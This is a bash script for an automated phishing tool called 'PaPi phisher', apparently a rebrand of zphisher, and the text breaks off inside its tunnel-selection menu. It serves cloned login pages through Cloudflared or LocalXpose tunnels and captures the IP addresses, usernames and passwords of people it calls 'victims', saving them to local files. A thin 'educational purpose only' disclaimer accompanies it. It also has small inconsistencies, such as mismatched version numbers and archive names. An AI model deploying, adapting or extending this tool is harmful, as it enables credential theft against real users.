#!/bin/bash

##   PaPi phisher 	: 	Automated Phishing Tool
##   Author 	: 	Ꮧ𝙽𝙾𝙽𝚈𝙼𝙾𝚄Ꭶ 
##   Version 	: 	2.4.5
##   Github 	: 	https://github.com/AnonymousRaihan/PaPiPhishing


##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
##

##   THANKS TO :
##   1RaY-1 - https://github.com/1RaY-1
##   Aditya Shakya - https://github.com/adi1090x
##   Ali Milani Amin - https://github.com/AliMilani
##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
##   Moises Tapia - https://github.com/MoisesTapia
##   Mr.Derek - https://github.com/E343IO
##   Mustakim Ahmed - https://github.com/bdhackers009
##   TheLinuxChoice - https://twitter.com/linux_choice


__version__="2.3.5"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} 𝙿𝚁𝙾𝙶𝚁𝙰𝙼 𝙸𝙽𝚃𝙴𝚁𝚁𝚄𝙿𝚃𝙴𝙳." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} 𝙿𝚁𝙾𝙶𝚁𝙰𝙼 𝚃𝙴𝚁𝙼𝙸𝙽𝙰𝚃𝙴𝙳." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Kill already running process
kill_pid() {
	check_PID="php cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

# Check for a newer release
check_update(){
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} 𝙲𝙷𝙴𝙲𝙺𝙸𝙽𝙶 𝙵𝙾𝚁 𝚄𝙿𝙳𝙰𝚃𝙴 : "
	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"

	if [[ $new_version != $__version__ ]]; then
		echo -ne "${ORANGE}update found\n"${WHITE}
		sleep 2
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝚄𝙿𝙳𝙰𝚃𝙴..."
		pushd "$HOME" > /dev/null 2>&1
		curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output ".papiphisher.tar.gz" "${tarball_url}"

		if [[ -e ".papiphisher.tar.gz" ]]; then
			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} 𝙴𝚁𝚁𝙾𝚁 𝙾𝙲𝙲𝚄𝚁𝙴𝙳 𝚆𝙷𝙸𝙻𝙴 𝙴𝚇𝚃𝚁𝙰𝙲𝚃𝙸𝙽𝙶."; reset_color; exit 1; }
			rm -f .zphisher.tar.gz
			popd > /dev/null 2>&1
			{ sleep 3; clear; banner_small; }
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝚄𝙿𝙳𝙰𝚃𝙴𝙳! 𝚁𝚄𝙽 Ꭾ𝙰Ꭾ𝙸𝙿𝙷𝙸𝚂𝙷𝙴𝚁 𝙰𝙶𝙰𝙸𝙽\n\n"${WHITE}
			{ reset_color ; exit 1; }
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} 𝙴𝚁𝚁𝙾𝚁 𝙾𝙲𝙲𝚄𝚁𝙴𝙳 𝚆𝙷𝙸𝙻𝙴 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙸𝙽𝙶."
			{ reset_color; exit 1; }
		fi
	else
		echo -ne "${GREEN}𝚄𝙿 𝚃𝙾 𝙳𝙰𝚃𝙴\n${WHITE}" ; sleep .5
	fi
}

## Check Internet Status
check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} 𝙸𝙽𝚃𝙴𝚁𝙽𝙴𝚃 𝚂𝚃𝙰𝚃𝚄𝚂 : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
	cat <<- EOF
	
   ${MAGENTA}
   ${MAGENTA}┏━━━┓────┏━━━┓──┏━━━┓┏┓────────┏┓───────── 
    ${BLUE}┃┏━┓┃────┃┏━┓┃──┃┏━┓┃┃┃────────┃┃───────── 
    ${PURPLE}┃┗━┛┃┏━━┓┃┗━┛┃┏┓┃┗━┛┃┃┗━┓┏┓┏━━┓┃┗━┓┏━━┓┏━┓ 
    ${RED}┃┏━━┛┃┏┓┃┃┏━━┛┣┫┃┏━━┛┃┏┓┃┣┫┃━━┫┃┏┓┃┃┃━┫┃┏┛ 
    ${GREEN}┃┃───┃┏┓┃┃┃───┃┃┃┃───┃┃┃┃┃┃┣━━┃┃┃┃┃┃┃━┫┃┃─ 
    ${DARKBLUE}┗┛───┗┛┗┛┗┛───┗┛┗┛───┗┛┗┛┗┛┗━━┛┗┛┗┛┗━━┛┗┛─                     ${RED}Version : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Ꭲ𝙾𝙾𝙻𝚂 Ꮯ𝚁𝙴𝙰𝚃𝙴 Ᏼ𝚈 Ꮧ𝙽𝙾𝙽𝚈𝙼𝙾𝚄Ꭶ (Ꭾ𝙰Ꭾ𝙸𝟷𝟼)${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
    ${BLUE}
    ${BLUE}╭─╮╶╶╶╶╭─╮╭╮╭─╮╭╮╶╭╮╭─╮╭╮╶╶╶╶╶╶╶ 
    ${BLUE}│││╭─╮╶│││├┤││││╰╮├┤│─┤│╰╮╭─╮╭┬╮ 
    ${BLUE}│╭╯││╰╮│╭╯│││╭╯│││││├─│││││┴┤│╭╯ 
    ${BLUE}╰╯╶╰──╯╰╯╶╰╯╰╯╶╰┴╯╰╯╰─╯╰┴╯╰─╯╰╯╶ 
${WHITE} ${__version__}
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} 𝙸𝙽𝚂𝚃𝙰𝙻𝙻𝙸𝙽𝙶 𝚁𝙴𝚀𝚄𝙸𝚁𝙴𝙳 𝙿𝙰𝙲𝙺𝙰𝙶𝙴𝚂..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} 𝙸𝙽𝚂𝚃𝙰𝙻𝙻𝙸𝙽𝙶 𝙿𝙰𝙲𝙺𝙰𝙶𝙴 : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} 𝙸𝙽𝚂𝚃𝙰𝙻𝙻𝙸𝙽𝙶 𝙿𝙰𝙲𝙺𝙰𝙶𝙴 : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} 𝙿𝙰𝙲𝙺𝙰𝙶𝙴𝚂 𝙰𝙻𝚁𝙴𝙰𝙳𝚈 𝙸𝙽𝚂𝚃𝙰𝙻𝙻𝙴𝙳.."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} 𝙸𝙽𝚂𝚃𝙰𝙻𝙻𝙸𝙽𝙶 𝙿𝙰𝙲𝙺𝙰𝙶𝙴 : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} 𝚄𝙽𝚂𝚄𝙿𝙿𝙾𝚁𝚃𝙴𝙳 𝙿𝙰𝙲𝙺𝙰𝙶𝙴 𝙼𝙰𝙽𝙰𝙶𝙴𝚁, Ꮠ𝙽𝚂𝚃𝙰𝙻𝙻 𝙿𝙰𝙲𝙺𝙰𝙶𝙴𝚂 𝙼𝙰𝙽𝚄𝙰𝙻𝙻𝚈."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} 𝙴𝚁𝚁𝙾𝚁 𝙾𝙲𝙲𝚄𝚁𝙴𝙳 𝚆𝙷𝙸𝙻𝙴 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙸𝙽𝙶 ${output}."
		{ reset_color; exit 1; }
	fi
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} 𝙲𝙻𝙾𝚄𝙳𝙵𝙻𝙰𝚁𝙴𝙳 𝙰𝙻𝚁𝙴𝙰𝙳𝚈 𝙸𝙽𝚂𝚃𝙰𝙻𝙻𝙴𝙳."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} 𝙸𝙽𝚂𝚃𝙰𝙻𝙻𝙸𝙽𝙶 𝙲𝙻𝙾𝚄𝙳𝙵𝙻𝙰𝚁𝙴𝙳..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Install LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} 𝙻𝙾𝙲𝙰𝙻𝚇𝙿𝙾𝚂𝙴 𝙰𝙻𝚁𝙴𝙰𝙳𝚈 𝙸𝙽𝚂𝚃𝙰𝙻𝙻𝙴𝙳."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} 𝙸𝙽𝚂𝚃𝙰𝙻𝙻𝙸𝙽𝙶 𝙻𝙾𝙲𝙰𝙻𝚇𝙿𝙾𝚂𝙴..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} 𝚃𝙷𝙰𝙽𝙺 𝚈𝙾𝚄 𝙵𝙾𝚁 𝚄𝚂𝙸𝙽𝙶 𝚃𝙷𝙸𝚂 𝚃𝙾𝙾𝙻. 𝙷𝙰𝚅𝙴 𝙰 𝙶𝙾𝙾𝙳 𝙳𝙰𝚈.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Author   ${RED}:  ${ORANGE}Ꮧ𝙽𝙾𝙽𝚈𝙼𝙾𝚄Ꭶ ${RED}[ ${ORANGE}Ꮋ𝙰𝙲𝙺𝙸𝙽𝙶 Ꭲ𝚄𝚃𝙾𝚁𝙸𝙰𝙻 ${RED}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/AnonymousRaihan
		${GREEN} Telegram   ${RED}:  ${CYAN}https://t.me/Anonymous_Raihan
		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}

		${WHITE} ${REDBG}Warning:${RESETBG}
		${CYAN}  𝚃𝙷𝙸𝚂 𝚃𝙾𝙾𝙻𝚂 𝙸𝚂 𝙼𝙰𝙳𝙴 𝙵𝙾𝚁 𝙴𝙳𝚄𝙲𝙰𝚃𝙸𝙾𝙽𝙰𝙻 𝙿𝚄𝚁𝙿𝙾𝚂𝙴 𝙾𝙽𝙻𝚈 ${RED}!${WHITE}${CYAN} 𝙰𝚄𝚃𝙷𝙾𝚁 𝚆𝙸𝙻𝙻 𝙽𝙾𝚃 𝙱𝙴 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙸𝙱𝙻𝙴 𝙵𝙾𝚁 𝙰𝙽𝚈 𝙼𝙸𝚂𝚄𝚂𝙴 𝙾𝙵 𝚃𝙷𝙸𝚂 𝚃𝙾𝙾𝙻𝙺𝙸𝚃 ${RED}!${WHITE}
		
		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
		  Yisus7u7

		${RED}[${WHITE}00${RED}]${ORANGE} Ꮇ𝙰𝙸𝙽 Ꮇ𝙴𝙽𝚄     ${RED}[${WHITE}99${RED}]${ORANGE} Ꭼ𝚇𝙸𝚃

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} 𝚂𝙴𝙻𝙴𝙲𝚃 𝙰𝙽 𝙾𝙿𝚃𝙸𝙾𝙽 : ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} 𝚁𝙴𝚃𝚄𝚁𝙽𝙸𝙽𝙶 𝚃𝙾 𝙼𝙰𝙸𝙽 𝙼𝙴𝙽𝚄..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙾𝙿𝚃𝙸𝙾𝙽, 𝚃𝚁𝚈 𝙰𝙶𝙰𝙸𝙽..."
			{ sleep 1; about; };;
	esac
}

## Choose custom port
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} 𝙳𝙾 𝚈𝙾𝚄 𝚆𝙰𝙽𝚃 𝙰 𝙲𝚄𝚂𝚃𝙾𝙼 𝙿𝙾𝚁𝚃 ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} 𝙴𝙽𝚃𝙴𝚁 𝚈𝙾𝚄𝚁 𝙲𝚄𝚂𝚃𝙾𝙼 𝟺-𝙳𝙸𝙶𝙸𝚃 Ꭾ𝙾𝚁𝚃 [𝟷𝟶𝟸𝟺-𝟿𝟿𝟿𝟿] : ${WHITE}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝟺-𝙳𝙸𝙶𝙸𝚃 Ꭾ𝙾𝚁𝚃 : $CU_P, 𝚃𝚁𝚈 𝙰𝙶𝙰𝙸𝙽...${WHITE}"
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} 𝚄𝚂𝙸𝙽𝙶 𝙳𝙴𝙵𝙰𝚄𝙻𝚃 𝙿𝙾𝚁𝚃 $PORT...${WHITE}\n"
	fi
}

## Setup website and start php server
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} 𝚂𝙴𝚃𝚃𝙸𝙽𝙶 𝚄𝙿 𝚂𝙴𝚁𝚅𝙴𝚁..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Ꮪ𝚃𝙰𝚁𝚃𝙸𝙽𝙶 ᎮᎻᎮ Ꮪ𝙴𝚁𝚅𝙴𝚁..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Ꮩ𝙸𝙲𝚃𝙸𝙼'𝚂 ᏐᎮ : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Ꮪ𝙰𝚅𝙴𝙳 𝙸𝙽 : ${ORANGE}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o '𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Ꭾ𝙰𝚂𝚂𝚆𝙾𝚁𝙳:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Ꭺ𝙲𝙲𝙾𝚄𝙽𝚃 : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Ꭾ𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Ꮪ𝙰𝚅𝙴𝙳 𝙸𝙽 : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Ꮃ𝙰𝙸𝚃𝙸𝙽𝙶 Ꮀ𝙾𝚁 Ꮑ𝙴𝚇𝚃 Ꮮ𝙾𝙶𝙸𝙽 Ꮠ𝙽𝙵𝙾, ${BLUE}Ctrl + C ${ORANGE}𝚃𝙾 𝙴𝚇𝙸𝚃. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Ꮃ𝙰𝙸𝚃𝙸𝙽𝙶 Ꮀ𝙾𝚁 Ꮮ𝙾𝙶𝙸𝙽 Ꮠ𝙽𝙵𝙾, ${BLUE}Ctrl + C ${ORANGE}𝚃𝙾 𝙴𝚇𝙸𝚃..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Ꮩ𝙸𝙲𝚃𝙸𝙼 ᏐᎮ Ꮀ𝙾𝚄𝙽𝙳 !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Ꮮ𝙾𝙶𝙸𝙽 𝙸𝙽𝙵𝙾 Ꮀ𝙾𝚄𝙽𝙳 !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start Cloudflared
start_cloudflared() { 
	rm .cld.log > /dev/null 2>&1 &
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} 𝙸𝙽𝙸𝚃𝙸𝙰𝙻𝙸𝚉𝙸𝙽𝙶... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Ꮮ𝙰𝚄𝙽𝙲𝙷𝙸𝙽𝙶 Ꮯ𝙻𝙾𝚄𝙳𝙵𝙻𝙰𝚁𝙴𝙳..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	sleep 8
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	custom_url "$cldflr_url"
	capture_data
}

localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Ꮯ𝚁𝙴𝙰𝚃𝙴 Ꭺ𝙽 Ꭺ𝙲𝙲𝙾𝚄𝙽𝚃 Ꭷ𝙽 ${ORANGE}localxpose.io${GREEN} & 𝙲𝙾𝙿𝚈 𝚃𝙷𝙴 𝚃𝙾𝙺𝙴𝙽\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Ꮠ𝙽𝙿𝚄𝚃 Ꮮ𝙾𝙲𝙻𝚇 Ꭲ𝙾𝙺𝙴𝙽 :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝚃𝙾 𝙸𝙽𝙿𝚄𝚃 𝙻𝙾𝙲𝙰𝙻𝚇𝙿𝙾𝚂𝙴 𝚃𝙾𝙺𝙴𝙽." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Start LocalXpose (Again...)
start_loclx() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} 𝙸𝙽𝙸𝚃𝙸𝙰𝙻𝙸𝚉𝙸𝙽𝙶... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Ꮯ𝙷𝙰𝙽𝙶𝙴 Ꮮ𝙾𝙲𝙻𝚇 Ꮪ𝙴𝚁𝚅𝙴𝚁 Ꮢ𝙴𝙶𝙸𝙾𝙽? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	sleep 12
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
	custom_url "$loclx_url"
	capture_data
}

## Start localhost
start_localhost() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} 𝙸𝙽𝙸𝚃𝙸𝙰𝙻𝙸𝚉𝙸𝙽𝙶... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Ꮪ𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 Ꮋ𝙾𝚂𝚃𝙴𝙳 Ꭺ𝚃 : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]

	EOF

